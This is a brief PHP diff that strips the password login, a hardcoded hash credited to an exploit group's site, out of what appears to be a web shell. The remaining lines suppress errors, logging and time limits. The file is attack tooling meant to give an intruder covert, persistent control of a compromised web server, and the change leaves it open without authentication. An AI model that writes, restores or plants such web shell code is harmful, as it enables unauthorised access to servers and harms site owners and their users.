@@ -1,30 +1,4 @@
 <?php
-$shellpass = "14a0a994cc362305be39965ed576576a"; // www.JawaTengahXploit.my.id
-session_start();
-@error_reporting(0);
-@set_time_limit(0);
-function Login() {
-?>
-<html>
-<head>
-</style>
-<center>
-<form method="post">
-<font face ='Ubuntu Condensed' size='3' color='black'>ASMARA HANCUR 
-<input type="password" name="pass">
-	<input type="submit" value="Login">
-</form>
-
-<?php
-exit;
-}
-if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
-    if( empty($shellpass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $shellpass) ) )
-        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
-    else
-        Login();
-?>
-<?php
 set_time_limit(0);
 error_reporting(0);
 @ini_set('error_log',null);
